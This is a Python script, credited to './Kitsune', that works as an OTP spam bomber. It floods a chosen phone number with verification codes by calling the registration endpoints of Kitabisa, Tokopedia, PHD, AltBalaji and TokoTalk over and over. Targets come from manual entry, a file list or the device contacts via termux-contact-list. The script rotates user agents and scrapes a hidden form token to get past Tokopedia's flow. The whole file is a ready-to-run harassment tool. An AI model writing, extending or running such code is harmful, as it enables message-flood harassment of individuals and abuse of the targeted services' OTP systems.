import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# Tidak ada author Untuk Sc ini kecuali ./Kitsune
# Update 26 january 2020 21:57
# Recode!, dosa Tanggung Sendiri
# Thanks For MyFriends, FourX, MhankBarBar, Maulana, Rexy
# Underground Science And Termux Tutorial Group
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------
class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSucces!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
			
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Succes!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm PHD {self.nomer} {h}Succes!'
		else:
			return f'\x1b[91mSpamm PHD {self.nomer} {m}Gagal!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Succes!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Gagal!'
	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Succes!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Gagal!'
# ------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tWant more? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		dly=int(input(k+'\tDelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam())
				elif jns == 'tkpd':
					print('\t'+z.tokped())
				elif jns == 'blji':
					print('\t'+z.balaji())
				elif jns == 'smua':
					print('\t'+z.spam())
					print('\t'+z.tokped())
					print('\t'+z.balaji())
					print('\t'+z.phd())
					print('\t'+z.TokoTalk())
				elif jns == 'pehd':
					print('\t'+z.phd())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tFile {fil} doesn`t exist')
def single():
	nomer=str(input(k+'\tPhone number : '+h))
	jm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'\tDelay : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal number : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'Delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(dly)
	apakah()
#-------------------------Fungsi Banner-----------------------
def logo():
	os.system('clear')
	auth=m+'Author : '+k+'./Kitsune'
	f='''
0011101010001010001000001100011001000000100000010101000100011000001000001011001000100001011100100101010011001010100010101100001001
0000000000101010001100001010001000001011000000000010010110110010110010110010000010011000001100010010100000101001111000111000101000
0101000110100000000000010001000001001000110000001011001010001000011001000000000100000011010010011000111000111000001010100010100000
0000000000100000000001000010000000100101100000010011000001101000111000000100000000100011011111011000000001100100000000000101010010
1000100011111000000101001110100000000101001011000001000010001010000000010000000000100110110000010110100110001101001101000000000000
0010000111010100011100111101010111000100000101100000100010010001100100100000010000000100001000000010000000110110000110001000000110
0111000101001000000001001000000100111000010100000011000100100110000010000100100001110010011111000100100100000001010010100000000000
0000100000000001001110000010001110010010001011111000011101010100110001100010000010010101110101000010000010010011000000011001111010
0000001010111000110010110000100000000000001000000100101100101101001101010100000000100010000010100000100010001000010010011100010000
0001010111100000010010111000101000000000000010001011110011110000000100101111011110010001010001101011100001010001000000000000011011
1000010000000000110001110010000100001001010000000000001000101110001001010011111100100110101010000010100100010101001000010101001010
1000110000001100000010000011010010110000001101001010110000010000001100010100000111000010011100010010100110010011000100000001000100
0000101100010000010011000001101100001001100100111000111111011010000001010011000110000011111000100010110100000100100101001001001001
1100010100000010010101001100000110010000110010100000000100000001011110010010001100101110000000100100010100000000000111110001110000
0010000100100100000000000001001010000101000100101110110000010100101101101000010000000011100110011000111100101100100000001010001000
1001100110100101011100000000111010001000000011000001100011100010100001001110010011001111100010000011010001011100010000001001101000
1010110000000000000000000000001000001000100101011010001011000010101001101000001001000011101110100010100000011000001000111010100010
0101001100011100010100010010100001011111000100010000010001100110110000110101001010100010000000001010100000100000111010001100011010
1001000010111110110111001000011010000000101000000010100100010100000000101100111001100101001000000000000010110010011000001011000110
0111001100110110001100110100001000010100101110001010011100100000110101111110101101010001101000110011111011011000011010010011100111
0000110100001010001101000001100011100110110000000000110110101100010110010111001010010100010000001000001110000000011101010000000101
0000000001000000000001000110010000000001001011100010000011000101000101011000011000001100000100101101100000111010100100110000100100
0000111000100101000001000010010010010001011000110010100011000001001101011111100011110001100110011000010000000000000001001010000010
1100101000011000111010110110110110000101000001110000001101001000001000000010011100111000110001000111110101001001100100001011000011
0100100011010101011100000000001000000000111000100101010000000000101100001100100100001000101001100000001100101001001001001111000000
1110100100000000001001010100011000000000100110000000011100001000100110000011000010011000000011010111000101000110001001101010000110
0100100101000101110000000010001101000000000101010101000001100000110010010000100000101001100101010110011011101110100001111000010001
1100101010010001000010100000111100111101101010001101000001100110101100111010101100000001111101001110100100001011101010010101000010
0001011101001000010100010000110000111110100010000010101100010111000101010011110011010001101001010000000000111001010100010011001111
1110000110111001110011000100110100100000001000000000101000000011010000010101001010100000110100011000001110000100001001001101101010
0110010011100000111001000001000000001000011001000011101110001001000011000010010010100101100100010001111000010001000000000000001010
0001000001011000011000000100011010001101000000010101010010101000000000000001100001010111110001000111000000010000000110001000000100
0101100001101110010110000111000100001010000100100001101000000110111001010101001100001011100010110000000010101000000010001000000100
0010001101100000110000001001110101000100100000011100110100101100000100110011110000011010100100000000000001000100000001111100001000
0100001100001010110010000001100000001100010100000100000111001000010001001000111100100011000100100010011001110000000100010000110001
1110000110000110010010000101010100100000000001100000010110010000001100000011111000101010100010000001100100101110100100010000000011
0010110000010101010011000101010100010000100100101000001101000000001000000010000100001000001011010000100001000010110101101000010100
1100000010001101000100010011001000100000000011011010000011100100010010100000000000000010001010110010101000001001101101000010011110
0000101010100010001010000100100010010101100011000110100101000001100001100101000000000000011110100100100110100000100101010000101010
0010110000110100000110000001100010001100001110100000001001101000111001111001011100000000011110000100000110101001001001000001011110
0010010001011010010100100000010000001001011100011101000001000001000001001000100001010001100101100000100101000000110000000000010001
0000100000011000000000001100001000001000000000000000000001111001011001010001100110110010011100010000000000101110101001010100001110
0011010100010001111010110101001000110010101100010100010000000100110001001000100100110100000000110000010100100100001001001000000010
0000000000100010100000000100000000000000100001010101001100011010100000000000001001101010001010000011000101111110011000010000111010
0010100000000000011100010100000001110001100101000100100000000000101011110011001000001001001010000010101001101000011011011000100001
0000001010000000011010111010001100000100100111000010110001110100100111100010011100000100001000010000000010101100010100101000000101
1000011100000110100000110111011010000011010010101000001000000000001100001100001000000110111000000110010001000001000110101111000100
0010000010011010000110100000011100000000011111010001010101111001100001110011000100000011101110100001100101001000110110101010100000
0000000010011001011101011010000011010100000111001001001010000000001000001001101011100100000100011100000000101001000000011011100100
0000000000000000001100100010111010010000001110000010001111110001010010000110000110000000010111010010001000101000101000100100001010
0011100000010101011000001011001100001010000100000001001001001000000101001001000011001100010010011001000100000001000100000000001000
0110100000101011010000010010011010001001100011011001100100010100100100001000101000100000000000010000000001011010001011001001111001
1000101100000011001001100100000000010000001000000101110001110011001010001000110011000100010100000000100010111010101100011110100111
0001011110000001100001100001000010010010001100110000110100000000101000010110011001001000100010100110000000011001000100001100010100
1100001010001101111000010001100101110100000100010110110001011001101000001100000000100101101110101110000101001000100111110100011010
0001000001101001001000000001000000100110000000000110011100000100000101100101000010001000001000101100110101110000000100110001100000
0110000001001100100110110101001000000011110000000000011000101100001011101000001010110001010100101000100111010100000010000001000100
0100110000000011010011000110001110110000100000010100100000110110100001000000001011000111110101100110011100110011010000000010000000
0011010001100010010100001000000000000000100010000010000100101100101101000011010100111000010000111100010001100100010010001100100101
1011001111010001001010100001000010010001000110000010011011010011111001100101010101111110101100101001010000000000001110110100101100
1010010100110000000010000001100001000010010000000000100001010101000010000111001000011001000000100100010110010100000010110000000000
1010010100000011010010101110000100000010001000000000101000000000010100000010100001100001000011011100101101001111101100011010000010
0110100000001100010010000010010001000000010000100001100101001010110000001100110110111101010101011000000001100100100111011101010100
0000100001000000001000011100100001011100000001001110100010000010000000000000010000101100001001010001110010010001000011100111010100
0000010000011001000010101000100101001111010110010010111010000001001001000100000010011001001001101100101000011001010011010111100000
0000100110010101000100001010010100000001101110110001000111000000000011000000011011010010110010001000011001100001010101010110010000
0110000100100000001001000000000000001011000101000000001010101000000111100100000000000010010000000010001101100000010101000000001010    
'''
	return u+f+'\n'+auth
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tDelay > '+h))
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(k+'Mode\n'+m+'-'*30+b+'\n\t1. Single Number\n\t2. Multi Number\n\t3. File List Number\n\t4. My Contact (Required termux-api)\n\t5. Back\n'+m+'-'*30)
	pil=str(input(k+'\tMode > '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == '5' or pil == '05'):
		jnspam()
	else:
		print(m+'             Don`t leave it blank')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(k+'spam\n'+m+'-'*30+h+'\n\t0. Exit\n\t1. Kita Bisa\n\t2. Tokopedia\n\t3. PHD\n\t4. Balaji (Without +62 or 0)\n\t5. All\n\t6. TokoTalk (Unlimited)\n'+m+'-'*30)
	while True:
		oy=str(input(k+'Spam > '+h))
		if( oy == '1' or oy == '01' ):
			jns='ktbs'
			break
		elif( oy == '2' or oy == '02' ):
			jns='tkpd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='pehd'
			break
		elif( oy == '4' or oy == '04' ):
			jns='blji'
			break
		elif( oy == '5' or oy == '05' ):
			jns='smua'
			break
		elif( oy == '6' or oy == '06' ):
			jns='ttk'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
			sys.exit()
		else:
			print(m+'             Don`t leave it blank')
			continue
	main()
jnspam()
